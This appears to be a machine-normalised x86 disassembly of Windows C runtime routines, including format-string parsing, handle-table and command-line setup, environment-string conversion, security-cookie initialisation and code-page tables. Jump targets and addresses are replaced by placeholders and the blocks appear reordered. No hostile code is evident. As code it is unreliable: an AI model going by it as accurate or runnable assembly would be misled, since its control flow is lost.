jns r-xdata
movzx eax [ ebx ]
cmp eax 0x36
jne r-xdata
cmp eax 0x68
je r-xdata
cmp eax 0x70
jg r-xdata
je r-xdata
or [ ebp - 0x408 ] 0x80
jmp r-xdata
sub eax edx
je r-xdata
or [ ebp - 0x408 ] 0x4
neg [ ebp - 0x430 ]
jmp r-xdata
or [ ebp - 0x40c ] 0xffffffff
jmp r-xdata
cmp eax 0x33
jne r-xdata
cmp [ ebx + 0x2 ] 0x34
jne r-xdata
or [ ebp - 0x408 ] 0x20
jmp r-xdata
cmp eax 0x6c
je r-xdata
sub eax 0x73
je r-xdata
je r-xdata
or [ ebp - 0x408 ] 0x40
cmp eax 0x53
jg r-xdata
or [ ebp - 0x408 ] 0x1
jmp r-xdata
sub eax esi
je r-xdata
cmp eax 0x64
je r-xdata
cmp [ ebx + 0x2 ] 0x32
jne r-xdata
add ebx 0x4
or [ ebp - 0x408 ] 0x8000
jmp r-xdata
cmp [ ebx ] 0x6c
jne r-xdata
cmp eax 0x77
jne r-xdata
cmp [ ebp - 0x40c ] 0xffffffff
mov ebx 0x7fffffff
je r-xdata
sub eax esi
je r-xdata
mov [ ebp - 0x40c ] edx
cmp eax 0x65
jl r-xdata
test ecx 0x1000
jne r-xdata
add edi edx
mov eax [ edi - 0x8 ]
mov edx [ edi - 0x4 ]
jmp r-xdata
sub eax 0x58
je r-xdata
je r-xdata
or [ ebp - 0x408 ] 0x4
jmp r-xdata
sub eax 0x3
jne r-xdata
cmp eax 0x69
je r-xdata
add ebx 0x4
and [ ebp - 0x408 ] 0xffff7fff
jmp r-xdata
or [ ebp - 0x408 ] 0x10
jmp r-xdata
add ebx esi
or [ ebp - 0x408 ] 0x1000
jmp r-xdata
or [ ebp - 0x408 ] 0x800
jmp r-xdata
add edi 0x4
test [ ebp - 0x408 ] 0x20
mov [ ebp - 0x418 ] edi
mov edi [ edi - 0x4 ]
mov [ ebp - 0x410 ] edi
je r-xdata
mov ebx [ ebp - 0x40c ]
mov [ ebp - 0x420 ] 0xa
sub eax 0x3
jne r-xdata
test [ ebp - 0x408 ] 0x80
mov [ ebp - 0x420 ] 0x10
je r-xdata
cmp [ ebp - 0x450 ] 0x0
jne r-xdata
cmp eax 0x67
jle r-xdata
add edi 0x4
test cl 0x20
je r-xdata
mov [ ebp - 0x418 ] edi
mov [ ebp - 0x454 ] 0x7
jmp r-xdata
sub eax esi
je r-xdata
test [ ebp - 0x408 ] 0x830
jne r-xdata
sub eax 0x41
je r-xdata
or [ ebp - 0x408 ] edx
jmp r-xdata
cmp eax 0x6f
je r-xdata
test edi edi
jne r-xdata
test edi edi
jne r-xdata
mov [ ebp - 0x454 ] 0x27
mov ecx [ ebp - 0x408 ]
test ecx 0x8000
je r-xdata
push 0x30
pop eax
mov [ ebp - 0x438 ] ax
mov eax [ ebp - 0x454 ]
add eax 0x51
mov [ ebp - 0x436 ] ax
mov [ ebp - 0x424 ] esi
jmp r-xdata
cmp [ ebp - 0x458 ] 0x0
je r-xdata
mov eax [ ebp - 0x408 ]
test al 0x40
je r-xdata
or [ ebp - 0x408 ] 0x40
cmp [ ebp - 0x40c ] 0x0
lea edi [ ebp - 0x404 ]
mov eax 0x200
mov [ ebp - 0x410 ] edi
mov [ ebp - 0x414 ] eax
jge r-xdata
cmp eax 0x69
je r-xdata
mov eax [ edi - 0x4 ]
test cl 0x40
je r-xdata
mov [ ebp - 0x418 ] edi
test cl 0x40
je r-xdata
test [ ebp - 0x408 ] 0x9000
mov ebx edx
mov edi eax
jne r-xdata
test edx edx
jg r-xdata
mov eax [ edi ]
add edi 0x4
mov [ ebp - 0x418 ] edi
test eax eax
je r-xdata
sub eax 0x7
je r-xdata
or [ ebp - 0x408 ] 0x20
add ecx 0x20
mov [ ebp - 0x460 ] 0x1
mov [ ebp - 0x420 ] ecx
sub eax esi
je r-xdata
cmp eax 0x75
je r-xdata
mov eax [ ebp - 0x410 ]
mov [ ebp - 0x428 ] 0x1
jmp r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x410 ] eax
and [ ebp - 0x414 ] 0x0
mov esi [ ebp - 0x410 ]
test ebx ebx
jle r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x410 ] eax
push [ ebp - 0x458 ]
call sub_1001a3eb
and [ ebp - 0x458 ] 0x0
pop ecx
mov ebx [ ebp - 0x430 ]
sub ebx [ ebp - 0x414 ]
sub ebx [ ebp - 0x424 ]
test [ ebp - 0x408 ] 0xc
mov [ ebp - 0x468 ] ebx
jne r-xdata
test eax 0x100
je r-xdata
jne r-xdata
mov [ ebp - 0x40c ] 0x6
jmp r-xdata
cmp eax 0x6e
je r-xdata
xor edx edx
cdq
jmp r-xdata
movzx eax [ edi - 0x4 ]
movsx eax [ edi - 0x4 ]
jmp r-xdata
cmp [ ebp - 0x40c ] 0x0
jge r-xdata
xor ebx ebx
jl r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x410 ] eax
push eax
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
sub eax esi
jne r-xdata
test [ ebp - 0x408 ] 0x830
jne r-xdata
sub eax esi
je r-xdata
cmp eax 0x78
je r-xdata
test ebx ebx
jne r-xdata
mov al [ esi ]
test al al
je r-xdata
mov edi [ ebp - 0x42c ]
mov ecx [ ebp - 0x424 ]
lea eax [ ebp - 0x438 ]
push eax
lea eax [ ebp - 0x41c ]
call sub_10020e85
test [ ebp - 0x408 ] 0x8
pop ecx
je r-xdata
mov edi ebx
test ebx ebx
jle r-xdata
test al 0x1
je r-xdata
push 0x2d
jmp r-xdata
cmp [ ebp - 0x40c ] eax
jle r-xdata
cmp cx 0x67
jne r-xdata
mov eax [ ebp - 0x418 ]
mov edx [ eax ]
add eax 0x8
mov esi [ DecodePointer@IAT ]
mov [ ebp - 0x418 ] eax
mov eax [ eax - 0x4 ]
mov [ ebp - 0x470 ] eax
lea eax [ ebp - 0x44c ]
push eax
push [ ebp - 0x460 ]
movsx eax cl
push [ ebp - 0x40c ]
mov [ ebp - 0x474 ] edx
push eax
push [ ebp - 0x414 ]
lea eax [ ebp - 0x474 ]
push edi
push eax
push [ rw-data ]
call esi
call eax
mov ebx [ ebp - 0x408 ]
add esp 0x1c
and ebx 0x80
je r-xdata
mov esi [ edi ]
add edi 0x4
mov [ ebp - 0x418 ] edi
call sub_10027516
test eax eax
je r-xdata
cmp eax 0x6f
jne r-xdata
test cl 0x40
je r-xdata
cdq
jmp r-xdata
and [ ebp - 0x408 ] 0xfffffff7
mov eax 0x200
cmp [ ebp - 0x40c ] eax
jle r-xdata
mov [ ebp - 0x40c ] 0x1
jmp r-xdata
neg eax
adc edx 0x0
neg edx
or [ ebp - 0x408 ] 0x100
test eax eax
jae r-xdata
mov [ ebp - 0x414 ] eax
test [ ebp - 0x408 ] 0x800
movsx eax [ eax ]
mov [ ebp - 0x410 ] ecx
je r-xdata
movzx eax [ edi ]
add edi 0x4
xor esi esi
inc esi
test [ ebp - 0x408 ] 0x20
mov [ ebp - 0x428 ] esi
mov [ ebp - 0x418 ] edi
mov [ ebp - 0x464 ] eax
je r-xdata
or [ ebp - 0x408 ] 0x20
jmp r-xdata
sub eax esi
jne r-xdata
cmp eax 0x58
je r-xdata
dec ebx
cmp [ eax ] 0x0
je r-xdata
sub eax [ ebp - 0x410 ]
lea ecx [ ebp - 0x44c ]
movzx eax al
push ecx
push eax
call sub_1002769e
pop ecx
pop ecx
test eax eax
je r-xdata
cmp [ ebp - 0x428 ] 0x0
jne r-xdata
test [ ebp - 0x408 ] 0x4
jne r-xdata
mov eax [ ebp - 0x42c ]
push 0x20
lea esi [ ebp - 0x41c ]
dec edi
call sub_10020e56
cmp [ ebp - 0x41c ] 0xffffffff
pop ecx
je r-xdata
test al 0x2
je r-xdata
push 0x2b
jmp r-xdata
pop eax
mov [ ebp - 0x438 ] ax
mov [ ebp - 0x424 ] 0x1
mov ebx 0xa3
cmp [ ebp - 0x40c ] ebx
jle r-xdata
mov [ ebp - 0x40c ] eax
mov [ ebp - 0x40c ] 0x1
jmp r-xdata
cmp [ ebp - 0x420 ] 0x67
jne r-xdata
cmp [ ebp - 0x40c ] 0x0
jne r-xdata
test [ ebp - 0x408 ] 0x20
je r-xdata
test [ ebp - 0x408 ] 0x80
mov [ ebp - 0x420 ] edx
je r-xdata
mov eax edi
or eax ebx
jne r-xdata
mov [ ebp - 0x40c ] eax
and [ ebp - 0x428 ] 0x0
jmp r-xdata
cdq
sub eax edx
mov [ ebp - 0x428 ] 0x1
jmp r-xdata
mov [ ebp - 0x404 ] ax
mov [ ebp - 0x434 ] al
lea eax [ ebp - 0x44c ]
push eax
mov eax [ ebp - 0x44c ]
mov [ ebp - 0x433 ] 0x0
push [ eax + 0xac ]
lea eax [ ebp - 0x434 ]
push eax
lea eax [ ebp - 0x404 ]
push eax
call sub_10028b0e
add esp 0x10
test eax eax
jns r-xdata
and [ ebp - 0x43c ] 0x0
add eax esi
inc esi
inc [ ebp - 0x414 ]
cmp [ ebp - 0x414 ] ebx
jl r-xdata
inc esi
push [ ebp - 0x410 ]
mov edi [ ebp - 0x42c ]
mov ecx [ ebp - 0x414 ]
lea eax [ ebp - 0x41c ]
call sub_10020e85
pop ecx
cmp [ ebp - 0x414 ] 0x0
jle r-xdata
mov edi ebx
test ebx ebx
jle r-xdata
test edi edi
jg r-xdata
push 0x20
mov ecx [ ebp - 0x420 ]
mov esi [ ebp - 0x40c ]
add esi 0x15d
push esi
call sub_1001bcbc
pop ecx
mov ecx [ ebp - 0x420 ]
mov [ ebp - 0x458 ] eax
test eax eax
je r-xdata
cmp [ edi ] 0x2d
jne r-xdata
test ebx ebx
jne r-xdata
lea eax [ ebp - 0x44c ]
push eax
push edi
push [ rw-data ]
call esi
call eax
pop ecx
pop ecx
mov eax [ ebp - 0x41c ]
mov [ esi ] eax
mov ax [ ebp - 0x41c ]
mov [ esi ] ax
jmp r-xdata
or [ ebp - 0x408 ] 0x200
jmp r-xdata
lea esi [ ebp - 0x205 ]
and [ ebp - 0x424 ] eax
sar eax 0x1
lea eax [ ebp - 0x404 ]
mov [ ebp - 0x410 ] eax
mov [ ebp - 0x414 ] esi
jmp r-xdata
mov [ ebp - 0x450 ] esi
jmp r-xdata
jmp r-xdata
test [ ebp - 0x408 ] 0x4
je r-xdata
mov edi [ ebp - 0x410 ]
mov ebx [ ebp - 0x414 ]
mov eax [ ebp - 0x42c ]
push 0x30
lea esi [ ebp - 0x41c ]
dec edi
call sub_10020e56
cmp [ ebp - 0x41c ] 0xffffffff
pop ecx
je r-xdata
mov [ ebp - 0x40c ] ebx
jmp r-xdata
mov [ ebp - 0x410 ] eax
mov [ ebp - 0x414 ] esi
mov edi eax
jmp r-xdata
push edi
jmp r-xdata
or [ ebp - 0x408 ] 0x100
inc edi
mov [ ebp - 0x410 ] edi
lea eax [ ebp - 0x44c ]
push eax
push edi
push [ rw-data ]
call esi
call eax
pop ecx
pop ecx
mov [ ebp - 0x450 ] 0x1
jmp r-xdata
mov eax [ ebp - 0x420 ]
cdq
push edx
push eax
push ebx
push edi
call sub_10025e50
add ecx 0x30
mov [ ebp - 0x468 ] ebx
mov edi eax
mov ebx edx
cmp ecx 0x39
jle r-xdata
mov eax edi
or eax ebx
je r-xdata
mov edi [ ebp - 0x468 ]
jmp r-xdata
or [ ebp - 0x41c ] 0xffffffff
jmp r-xdata
push [ ebp - 0x464 ]
mov eax [ ebp - 0x42c ]
lea esi [ ebp - 0x41c ]
call sub_10020e56
add edi [ ebp - 0x420 ]
pop ecx
test ebx ebx
jg r-xdata
test edi edi
jg r-xdata
call sub_1001cbb0
pop ecx
jmp r-xdata
mov [ esi ] cl
dec esi
jmp r-xdata
add ecx [ ebp - 0x454 ]
lea eax [ ebp - 0x205 ]
sub eax esi
inc esi
test [ ebp - 0x408 ] 0x200
mov [ ebp - 0x414 ] eax
mov [ ebp - 0x410 ] esi
je r-xdata
test edi edi
jg r-xdata
cmp [ ebp - 0x41c ] 0x0
jl r-xdata
lea eax [ ebp - 0x44c ]
push eax
mov eax [ ebp - 0x44c ]
push [ eax + 0xac ]
lea eax [ ebp - 0x464 ]
push edi
push eax
dec ebx
call sub_10028b0e
add esp 0x10
mov [ ebp - 0x420 ] eax
test eax eax
jle r-xdata
jmp r-xdata
mov eax [ ebp - 0x40c ]
dec [ ebp - 0x40c ]
test eax eax
jg r-xdata
test eax eax
je r-xdata
mov eax [ ebp - 0x42c ]
push 0x20
lea esi [ ebp - 0x41c ]
dec edi
call sub_10020e56
cmp [ ebp - 0x41c ] 0xffffffff
pop ecx
je r-xdata
dec [ ebp - 0x410 ]
mov ecx [ ebp - 0x410 ]
mov [ ecx ] 0x30
inc eax
jmp r-xdata
mov ecx esi
cmp [ ecx ] 0x30
je r-xdata
sub_10021ab2
mov edi edi
push ebp
mov ebp esp
sub esp 0x4c
push esi
lea eax [ ebp - 0x4c ]
push eax
call [ GetStartupInfoW@IAT ]
push 0x40
push 0x20
pop esi
push esi
call sub_1001bd01
pop ecx
pop ecx
xor ecx ecx
cmp eax ecx
jne r-xdata
lea edx [ eax + 0x800 ]
mov [ rw-data ] eax
mov [ rw-data ] esi
cmp eax edx
jae r-xdata
or eax 0xffffffff
jmp r-xdata
push ebx
push edi
cmp [ ebp - 0x1a ] cx
je r-xdata
add eax 0x5
pop esi
leave
retn
xor ebx ebx
mov eax [ ebp - 0x18 ]
cmp eax ecx
je r-xdata
or [ eax - 0x5 ] 0xffffffff
mov [ eax - 0x1 ] 0xa00
mov [ eax + 0x3 ] ecx
mov [ eax + 0x1f ] 0xa00
mov [ eax + 0x21 ] 0xa
mov [ eax + 0x33 ] ecx
mov [ eax + 0x2f ] cl
mov esi [ rw-data ]
add eax 0x40
lea edx [ eax - 0x5 ]
add esi 0x800
cmp edx esi
jb r-xdata
mov [ esi + 0x4 ] 0x81
test ebx ebx
jne r-xdata
cmp eax 0xfffffffe
je r-xdata
mov ebx [ eax ]
add eax 0x4
mov [ ebp - 0x4 ] eax
add eax ebx
mov esi 0x800
mov [ ebp - 0x8 ] eax
cmp ebx esi
jl r-xdata
lea eax [ ebx - 0x1 ]
neg eax
sbb eax eax
add eax 0xfffffff5
push 0xfffffff6
pop eax
jmp r-xdata
or [ esi + 0x4 ] 0x80
jmp r-xdata
cmp [ rw-data ] ebx
jge r-xdata
mov ebx esi
or [ esi + 0x4 ] 0x40
mov [ esi ] 0xfffffffe
test edi edi
je r-xdata
push eax
call [ GetStdHandle@IAT ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
inc ebx
cmp ebx 0x3
jl r-xdata
xor edi edi
test ebx ebx
jle r-xdata
mov edi rw-data
mov esi ebx
shl esi 0x6
add esi [ rw-data ]
mov eax [ esi ]
cmp eax 0xffffffff
je r-xdata
push [ rw-data ]
call [ SetHandleCount@IAT ]
xor eax eax
push edi
call [ GetFileType@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
cmp eax 0xffffffff
je r-xdata
mov ebx [ rw-data ]
add [ rw-data ] 0x20
lea ecx [ eax + 0x800 ]
mov [ edi ] eax
cmp eax ecx
jae r-xdata
and eax 0xff
mov [ esi ] edi
cmp eax 0x2
jne r-xdata
add [ ebp - 0x8 ] 0x4
inc edi
inc [ ebp - 0x4 ]
cmp edi ebx
jl r-xdata
cmp eax 0xfffffffe
je r-xdata
add edi 0x4
cmp [ rw-data ] ebx
jl r-xdata
add eax 0x5
cmp eax 0x3
jne r-xdata
or [ esi + 0x4 ] 0x40
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov cl [ ecx ]
test cl 0x1
je r-xdata
push 0x40
push 0x20
call sub_1001bd01
pop ecx
pop ecx
test eax eax
je r-xdata
jmp r-xdata
or [ eax - 0x5 ] 0xffffffff
and [ eax + 0x3 ] 0x0
and [ eax + 0x1f ] 0x80
and [ eax + 0x33 ] 0x0
mov [ eax - 0x1 ] 0xa00
mov [ eax + 0x20 ] 0xa0a
mov [ eax + 0x2f ] 0x0
mov ecx [ edi ]
add eax 0x40
add ecx esi
lea edx [ eax - 0x5 ]
cmp edx ecx
jb r-xdata
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
je r-xdata
or [ esi + 0x4 ] 0x8
test cl 0x8
jne r-xdata
or eax 0xffffffff
jmp r-xdata
inc [ esi + 0x8 ]
jmp r-xdata
mov esi edi
and esi 0x1f
mov eax edi
sar eax 0x5
shl esi 0x6
add esi [ eax * 4 + rw-data ]
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ esi ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax ]
mov [ esi + 0x4 ] al
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
je r-xdata
push eax
call [ GetFileType@IAT ]
test eax eax
je r-xdata
pop edi
pop ebx
inc [ esi + 0x8 ]
sub_10021cf7
mov edi edi
push esi
push edi
mov edi rw-data
add edi 0x4
cmp edi rw-data
jl r-xdata
lea ecx [ eax + 0x800 ]
cmp eax ecx
jae r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
pop edi
pop esi
retn
push [ edi ]
call sub_1001a3eb
and [ edi ] 0x0
pop ecx
lea esi [ eax + 0xc ]
mov eax [ edi ]
add esi 0x40
add eax 0x800
lea ecx [ esi - 0xc ]
cmp ecx eax
jb r-xdata
push esi
call [ DeleteCriticalSection@IAT ]
cmp [ esi - 0x4 ] 0x0
je r-xdata
sub_10021d4a
cmp [ rw-data ] 0x0
jne r-xdata
push esi
mov esi [ rw-data ]
push edi
xor edi edi
test esi esi
jne r-xdata
call sub_100228bf
mov al [ esi ]
test al al
jne r-xdata
or eax 0xffffffff
jmp r-xdata
cmp al 0x3d
je r-xdata
push 0x4
inc edi
push edi
call sub_1001bd01
mov edi eax
pop ecx
pop ecx
mov [ rw-data ] edi
test edi edi
je r-xdata
pop edi
pop esi
retn
push esi
call sub_1001cbb0
pop ecx
lea esi [ esi + eax + 0x1 ]
inc edi
mov esi [ rw-data ]
push ebx
jmp r-xdata
cmp [ esi ] 0x0
jne r-xdata
push esi
call sub_1001cbb0
cmp [ esi ] 0x3d
pop ecx
lea ebx [ eax + 0x1 ]
je r-xdata
push [ rw-data ]
call sub_1001a3eb
and [ rw-data ] 0x0
and [ edi ] 0x0
mov [ rw-data ] 0x1
xor eax eax
add esi ebx
push 0x1
push ebx
call sub_1001bd01
pop ecx
pop ecx
mov [ edi ] eax
test eax eax
je r-xdata
push [ rw-data ]
call sub_1001a3eb
and [ rw-data ] 0x0
or eax 0xffffffff
jmp r-xdata
push esi
push ebx
push eax
call sub_1001daf3
add esp 0xc
test eax eax
jne r-xdata
pop ecx
pop ebx
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_1001ea23
int3
add edi 0x4
sub_10021e26
mov edi edi
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0x10 ]
push ebx
xor eax eax
push esi
mov [ edi ] eax
mov esi edx
mov edx [ ebp + 0xc ]
mov [ ecx ] 0x1
cmp [ ebp + 0x8 ] eax
je r-xdata
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
add [ ebp + 0x8 ] 0x4
mov [ ebx ] edx
inc [ edi ]
test edx edx
je r-xdata
xor eax eax
cmp [ ebp - 0x4 ] eax
mov bl 0x22
sete al
inc esi
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov bl [ esi ]
movzx eax bl
push eax
inc esi
call sub_10028c91
pop ecx
test eax eax
je r-xdata
mov al [ esi ]
mov [ edx ] al
inc edx
mov [ ebp + 0xc ] edx
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
test bl bl
je r-xdata
inc [ edi ]
cmp [ ebp + 0xc ] 0x0
je r-xdata
cmp [ esi ] 0x22
jne r-xdata
cmp bl 0x20
je r-xdata
dec esi
jmp r-xdata
inc esi
mov ecx [ ebp + 0xc ]
mov al [ esi ]
inc [ ebp + 0xc ]
mov [ ecx ] al
test edx edx
je r-xdata
cmp bl 0x9
jne r-xdata
and [ ebp - 0x4 ] 0x0
mov [ edx - 0x1 ] 0x0
mov eax [ ebp + 0x8 ]
pop esi
pop ebx
test eax eax
je r-xdata
mov al [ esi ]
cmp al 0x20
je r-xdata
inc [ ecx ]
leave
retn
and [ eax ] 0x0
inc esi
jmp r-xdata
cmp al 0x9
jne r-xdata
cmp [ esi ] 0x0
je r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
inc [ ecx ]
mov eax [ ebp + 0x8 ]
add [ ebp + 0x8 ] 0x4
mov [ eax ] edx
cmp [ esi ] 0x5c
je r-xdata
inc esi
inc ecx
cmp [ esi ] 0x22
jne r-xdata
test ecx ecx
je r-xdata
test cl 0x1
jne r-xdata
mov al [ esi ]
test al al
je r-xdata
dec ecx
test edx edx
je r-xdata
shr ecx 0x1
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test edx edx
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
inc [ edi ]
test ecx ecx
jne r-xdata
mov [ edx ] 0x5c
inc edx
xor eax eax
xor ebx ebx
cmp [ ebp - 0x4 ] eax
sete al
mov [ ebp - 0x4 ] eax
lea eax [ esi + 0x1 ]
cmp [ eax ] 0x22
jne r-xdata
inc [ edi ]
mov ecx [ ebp + 0x10 ]
jmp r-xdata
mov [ edx ] 0x0
inc edx
mov [ ebp + 0xc ] edx
test ebx ebx
je r-xdata
cmp al 0x20
je r-xdata
mov [ ebp + 0xc ] edx
mov esi eax
jmp r-xdata
cmp [ esi ] 0x0
je r-xdata
inc esi
jmp r-xdata
movsx eax al
push eax
test edx edx
je r-xdata
cmp al 0x9
je r-xdata
xor ebx ebx
inc ebx
xor ecx ecx
jmp r-xdata
call sub_10028c91
pop ecx
test eax eax
je r-xdata
call sub_10028c91
pop ecx
test eax eax
je r-xdata
inc [ edi ]
mov edx [ ebp + 0xc ]
inc esi
inc [ edi ]
mov ecx [ ebp + 0xc ]
mov al [ esi ]
inc [ ebp + 0xc ]
mov [ ecx ] al
jmp r-xdata
mov al [ esi ]
mov ecx [ ebp + 0xc ]
inc [ ebp + 0xc ]
mov [ ecx ] al
inc esi
inc [ edi ]
sub_10021fc0
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
xor ebx ebx
push esi
push edi
cmp [ rw-data ] ebx
jne r-xdata
push 0x104
mov esi rw-data
push esi
push ebx
mov [ rw-data ] bl
call [ GetModuleFileNameA@IAT ]
mov eax [ rw-data ]
mov [ rw-data ] esi
cmp eax ebx
je r-xdata
call sub_100228bf
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x4 ] eax
cmp [ eax ] bl
jne r-xdata
or eax 0xffffffff
mov ecx [ ebp - 0xc ]
cmp ecx 0xffffffff
jae r-xdata
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x8 ]
push eax
push ebx
push ebx
lea edi [ ebp - 0xc ]
call sub_10021e26
mov eax [ ebp - 0x8 ]
add esp 0xc
cmp eax 0x3fffffff
jae r-xdata
mov edi eax
shl edi 0x2
lea eax [ edi + ecx ]
cmp eax ecx
jb r-xdata
push eax
call sub_1001bcbc
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x8 ]
push eax
add edi esi
push edi
push esi
lea edi [ ebp - 0xc ]
call sub_10021e26
mov eax [ ebp - 0x8 ]
add esp 0xc
dec eax
mov [ rw-data ] eax
mov [ rw-data ] esi
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_1002207b
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
call [ GetEnvironmentStringsW@IAT ]
mov ebx eax
xor esi esi
cmp ebx esi
jne r-xdata
cmp [ ebx ] si
je r-xdata
xor eax eax
jmp r-xdata
push edi
mov edi [ WideCharToMultiByte@IAT ]
push esi
push esi
push esi
sub eax ebx
push esi
sar eax 0x1
inc eax
push eax
push ebx
push esi
push esi
mov [ ebp - 0xc ] eax
call edi
mov [ ebp - 0x8 ] eax
cmp eax esi
je r-xdata
add eax 0x2
cmp [ eax ] si
jne r-xdata
pop esi
pop ebx
leave
retn
push ebx
call [ FreeEnvironmentStringsW@IAT ]
xor eax eax
push eax
call sub_1001bcbc
pop ecx
mov [ ebp - 0x4 ] eax
cmp eax esi
je r-xdata
add eax 0x2
cmp [ eax ] si
jne r-xdata
push esi
push esi
push [ ebp - 0x8 ]
push eax
push [ ebp - 0xc ]
push ebx
push esi
push esi
call edi
test eax eax
jne r-xdata
push ebx
call [ FreeEnvironmentStringsW@IAT ]
mov eax [ ebp - 0x4 ]
jmp r-xdata
push [ ebp - 0x4 ]
call sub_1001a3eb
pop ecx
mov [ ebp - 0x4 ] esi
pop edi
sub_10022112
mov edi edi
push esi
mov eax r--data
mov esi r--data
push edi
mov edi eax
cmp eax esi
jae r-xdata
pop edi
pop esi
retn
mov eax [ edi ]
test eax eax
je r-xdata
add edi 0x4
cmp edi esi
jb r-xdata
call eax
sub_10022138
mov edi edi
push esi
mov eax r--data
mov esi r--data
push edi
mov edi eax
cmp eax esi
jae r-xdata
pop edi
pop esi
retn
mov eax [ edi ]
test eax eax
je r-xdata
add edi 0x4
cmp edi esi
jb r-xdata
call eax
sub_1002215e
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
push ebx
push edi
mov edi 0xbb40e64e
mov ebx 0xffff0000
cmp eax edi
je r-xdata
push esi
lea eax [ ebp - 0x8 ]
push eax
call [ GetSystemTimeAsFileTime@IAT ]
mov esi [ ebp - 0x4 ]
xor esi [ ebp - 0x8 ]
call [ GetCurrentProcessId@IAT ]
xor esi eax
call [ GetCurrentThreadId@IAT ]
xor esi eax
call [ GetTickCount@IAT ]
xor esi eax
lea eax [ ebp - 0x10 ]
push eax
call [ QueryPerformanceCounter@IAT ]
mov eax [ ebp - 0xc ]
xor eax [ ebp - 0x10 ]
xor esi eax
cmp esi edi
jne r-xdata
test ebx eax
je r-xdata
test ebx esi
jne r-xdata
mov esi 0xbb40e64f
jmp r-xdata
not eax
mov [ rw-data ] eax
jmp r-xdata
mov [ rw-data ] esi
not esi
mov [ rw-data ] esi
pop esi
mov eax esi
or eax 0x4711
shl eax 0x10
or esi eax
pop edi
pop ebx
leave
retn
sub_100221f9
sub eax 0x3a4
je r-xdata
mov eax 0x411
retn
sub eax 0x4
je r-xdata
mov eax 0x804
retn
sub eax 0xd
je r-xdata
mov eax 0x412
retn
dec eax
je r-xdata
mov eax 0x404
retn
xor eax eax
retn
sub_10022228
mov edi edi
push esi
push edi
mov esi eax
push 0x101
xor edi edi
lea eax [ esi + 0x1c ]
push edi
push eax
call sub_1001a9b0
xor eax eax
movzx ecx ax
mov eax ecx
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] edi
shl ecx 0x10
or eax ecx
lea edi [ esi + 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
mov ecx rw-data
add esp 0xc
lea eax [ esi + 0x1c ]
sub ecx esi
mov edi 0x101
mov dl [ ecx + eax ]
mov [ eax ] dl
inc eax
dec edi
jne r-xdata
lea eax [ esi + 0x11d ]
mov esi 0x100
mov dl [ eax + ecx ]
mov [ eax ] dl
inc eax
dec esi
jne r-xdata
pop edi
pop esi
retn
sub_1002228c
mov edi edi
push ebp
mov ebp esp
sub esp 0x51c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push edi
lea eax [ ebp - 0x518 ]
push eax
push [ esi + 0x4 ]
call [ GetCPInfo@IAT ]
mov edi 0x100
test eax eax
je r-xdata
lea eax [ esi + 0x11d ]
mov [ ebp - 0x51c ] 0xffffff9f
xor ecx ecx
sub [ ebp - 0x51c ] eax
xor eax eax
cmp edx 0x19
ja r-xdata
or [ esi + ecx + 0x1d ] 0x10
lea edx [ ecx + 0x20 ]
jmp r-xdata
mov [ ebp + eax - 0x104 ] al
inc eax
cmp eax edi
jb r-xdata
mov al [ ebp - 0x512 ]
mov [ ebp - 0x104 ] 0x20
test al al
je r-xdata
mov [ eax ] 0x0
or [ esi + ecx + 0x1d ] 0x20
lea edx [ ecx - 0x20 ]
mov [ eax ] dl
jmp r-xdata
push 0x0
push [ esi + 0xc ]
lea eax [ ebp - 0x504 ]
push [ esi + 0x4 ]
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push 0x1
push 0x0
call sub_10022aab
xor ebx ebx
push ebx
push [ esi + 0x4 ]
lea eax [ ebp - 0x204 ]
push edi
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push edi
push [ esi + 0xc ]
push ebx
call sub_1001b6dd
add esp 0x44
push ebx
push [ esi + 0x4 ]
lea eax [ ebp - 0x304 ]
push edi
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push 0x200
push [ esi + 0xc ]
push ebx
call sub_1001b6dd
add esp 0x24
xor eax eax
lea ebx [ ebp - 0x511 ]
mov edx [ ebp - 0x51c ]
lea eax [ esi + ecx + 0x11d ]
add edx eax
lea ebx [ edx + 0x20 ]
cmp ebx 0x19
ja r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_1001a809
leave
retn
inc ecx
cmp ecx edi
jb r-xdata
test cl 0x2
je r-xdata
or [ esi + eax + 0x1d ] 0x10
mov cl [ ebp + eax - 0x204 ]
jmp r-xdata
mov al [ ebx + 0x1 ]
add ebx 0x2
test al al
